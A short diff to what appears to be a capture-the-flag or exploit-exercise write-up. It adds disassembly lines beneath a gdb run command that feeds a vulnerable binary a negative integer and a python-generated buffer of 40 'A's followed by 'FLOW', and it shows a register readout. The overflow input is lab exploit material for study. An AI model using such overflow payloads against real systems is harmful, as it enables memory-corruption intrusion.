@@ -59,6 +59,10 @@ FLOW
 ```
 r -2147483637 $(python -c 'print "A"*40 + "FLOW"')
 
+
+   0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx
+=> 0x0804845a <+54>:	mov    0xc(%ebp),%eax
+
 i r $ecx
 ecx            0x2c	44
 ```
